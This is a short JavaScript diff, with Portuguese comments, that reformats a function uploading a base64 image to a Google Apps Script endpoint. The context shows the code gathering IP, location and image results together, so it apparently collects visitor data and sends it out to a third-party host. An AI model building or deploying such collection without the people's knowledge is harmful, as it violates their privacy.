@@ -140,23 +140,27 @@
       }
     };
 
-    const uploadParaDrive = async (imageBase64) => {
-      const url = "https://script.google.com/macros/s/AKfycbzoinFdcKunrWrDhxHDSXfNswmB1y64ZgjwfrFRYvNIPr2d1-NDDoponlNGegHXZn2kcw/exec";
-      try {
-        const res = await fetch(url, {
-          method: "POST",
-          body: JSON.stringify({ image: imageBase64 }),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        });
-        const data = await res.json();
-        return data.link || null;
-      } catch (e) {
-        console.error("Erro ao enviar para o Drive:", e.message);
-        return null;
-      }
-    };
+  const uploadParaDrive = async (imageBase64) => {
+  const url = "https://script.google.com/macros/s/AKfycbzoinFdcKunrWrDhxHDSXfNswmB1y64ZgjwfrFRYvNIPr2d1-NDDoponlNGegHXZn2kcw/exec";
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ image: imageBase64 })
+    });
+
+    const data = await res.json();
+
+    // ⚠️ Esta linha abaixo é ESSENCIAL
+    return data.link || null;
+
+  } catch (e) {
+    console.error("Erro ao enviar para o Drive:", e.message);
+    return null;
+  }
+};
 
     // Executar tudo
     const [ipResult, locResult, imgResult] = await Promise.all([
